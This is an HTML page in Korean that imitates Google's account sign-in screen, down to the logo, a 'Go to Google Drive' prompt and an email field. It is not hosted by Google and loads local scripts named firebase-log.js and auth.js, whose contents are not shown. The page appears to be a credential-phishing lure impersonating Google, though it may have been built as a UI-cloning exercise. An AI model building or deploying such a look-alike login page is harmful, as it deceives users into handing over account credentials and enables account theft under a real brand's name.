<!DOCTYPE html>
<html lang="ko" dir="ltr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>로그인 - Google 계정</title>

  <!-- 글꼴: Noto Sans KR (src) -->
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link
    href="https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@400;500;700&display=swap"
    rel="stylesheet"
  />

  <link rel="stylesheet" href="css/login.css" />

  <!-- Google tag (gtag.js) -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-L92HHMB9Y9"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-L92HHMB9Y9');
  </script>
</head>
<body>
  <main class="page">
    <div class="card" role="dialog" aria-labelledby="signin-title">
      <!-- 상단 로딩바 -->
      <div class="progress" id="progress" role="progressbar" aria-label="로드 중" aria-hidden="true">
        <div class="progress__buffer"></div>
        <div class="progress__bar progress__bar--primary"><span class="progress__inner"></span></div>
        <div class="progress__bar progress__bar--secondary"><span class="progress__inner"></span></div>
      </div>

      <!-- 좌측: 제목 영역 -->
      <section class="card__left">
        <img
          class="logo"
          src="assets/googleg_gradient_standard_48px.svg"
          alt="Google"
        />
        <h1 class="card__title" id="signin-title">로그인</h1>
        <p class="card__subtitle">Google Drive로 이동</p>
      </section>

      <!-- 우측: 폼 영역 -->
      <section class="card__right">
        <form id="signin-form" novalidate>
          <div class="field" id="id-field">
            <input
              type="text"
              id="identifier"
              class="field__input"
              placeholder=" "
              autocomplete="username"
              aria-describedby="id-error"
              autofocus
            />
            <label class="field__label" for="identifier">이메일 또는 휴대전화</label>
          </div>
          <p class="field__error" id="id-error" role="alert"></p>

          <a href="#" class="link forgot">이메일을 잊으셨나요?</a>

          <p class="guest">
            내 컴퓨터가 아닌가요? 게스트 모드를 사용하여 비공개로 로그인하세요.
            <a href="#" class="link">게스트 모드 사용 방법 자세히 알아보기</a>
          </p>

          <div class="actions">
            <button type="button" class="btn-text">계정 만들기</button>
            <button type="submit" class="btn-primary">다음</button>
          </div>
        </form>
      </section>
    </div>
  </main>

  <!-- 하단 -->
  <footer class="footer">
    <div class="lang" role="button" tabindex="0">
      <span>한국어</span>
      <svg class="lang__caret" viewBox="0 0 24 24" aria-hidden="true">
        <path d="M7 10l5 5 5-5z" />
      </svg>
    </div>
    <nav class="footer__links">
      <a href="#">도움말</a>
      <a href="#">개인정보처리방침</a>
      <a href="#">약관</a>
    </nav>
  </footer>

  <script type="module" src="js/firebase-log.js"></script>
  <script src="js/auth.js"></script>
  <script>
    initEmailScreen();
  </script>
</body>
</html>
